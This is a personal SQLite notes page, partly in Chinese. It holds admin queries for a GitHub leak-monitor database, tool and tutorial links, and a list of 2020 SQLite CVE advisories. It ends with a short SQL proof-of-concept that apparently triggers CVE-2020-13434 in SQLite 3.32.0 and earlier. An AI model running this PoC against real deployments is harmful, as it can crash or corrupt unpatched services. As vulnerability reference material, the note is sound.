# sqlite

```bash
apt install sqlite
cd /srv/Github-Monitor/server
sudo sqlite3 github.db
.table
.schema
.schema Leakage

select * from Leakage limit 1;
select count(*) from Leakage ;
select count(*) from Leakage where keyword = 'xxx';
delete from Leakage where keyword = 'xxx';
delete from Leakage where keyword = 'xxx.cn';
```

Instantly generate REST & GraphQL APIs on any Database (Supports : MySQL, PostgreSQL, MsSQL, SQLite, MariaDB) https://xgenecloud.com| 这种东西好像也没有什么卵用
https://github.com/xgenecloud/xgenecloud

http://www.nsfocus.net/vulndb/46788
SQLite ext/fts3/fts3.c释放后重利用漏洞（CVE-2020-13630）

SQLite alter.c/build.c未授权信息修改漏洞（CVE-2020-13631）
http://www.nsfocus.net/vulndb/46787

SQLite ext/fts3/fts3_snippet.c空指针间接引用漏洞（CVE-2020-13632）
http://www.nsfocus.net/vulndb/46786

写个数据库:
Writing a sqlite clone from scratch in C
https://github.com/cstack/db_tutorial

[Docker中SQlite的配置和挂载](https://juejin.im/post/6844903623789379598)


## 安全漏洞

[SQLite 输入验证错误漏洞](http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1159)
> SQLite 3.32.0及之前版本中的printf.c文件的sqlite3_str_vappendf存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。
> http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1160
> SQLite 3.32.0及之前版本中的expr.c文件的sqlite3ExprCodeTarget存在安全漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。
> POC: https://www.sqlite.org/src/info/23439ea582241138

```bash
sqlite3 CVE-2020-13434.db
CREATE TABLE a(b DOUBLE CHECK( NOT CASE WHEN printf(b, b) THEN 0 END) UNIQUE ON CONFLICT REPLACE);
CREATE TRIGGER c INSERT ON a BEGIN INSERT INTO a SELECT group_concat(b, 2147483647) FROM a;END;
INSERT INTO a(b, b, b) VALUES(NULL, 9, 3);
UPDATE a SET b = 0;
INSERT INTO a VALUES('GERMANY''s%'), ('Y'), ('Brand#23')
```

